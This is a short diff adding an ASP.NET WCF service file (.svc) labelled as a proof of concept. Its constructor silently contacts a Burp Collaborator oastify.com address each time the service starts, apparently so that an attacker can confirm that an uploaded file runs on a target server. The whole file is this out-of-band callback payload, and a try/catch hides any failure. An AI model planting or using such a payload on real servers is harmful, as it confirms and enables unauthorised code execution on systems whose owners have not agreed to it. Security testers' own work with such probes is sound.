@@ -1,0 +1,35 @@
+<%@ ServiceHost Language="C#" Debug="true" Service="PoCService" %>
+
+<%@ Import Namespace="System.ServiceModel" %>
+
+<%@ Import Namespace="System.ServiceModel.Activation" %>
+
+<%@ Import Namespace="System.Net" %>
+
+
+
+public class PoCService
+
+{
+
+    public PoCService()
+
+    {
+
+        try
+
+        {
+
+            // OAST: Tenta di contattare il tuo collaborator all'inizializzazione del servizio
+
+            WebClient wc = new WebClient();
+
+            wc.DownloadString("http://bjy42ap1gooqdo574nzcysq86zcq0ko9.oastify.com");
+
+        }
+
+        catch { }
+
+    }
+
+}
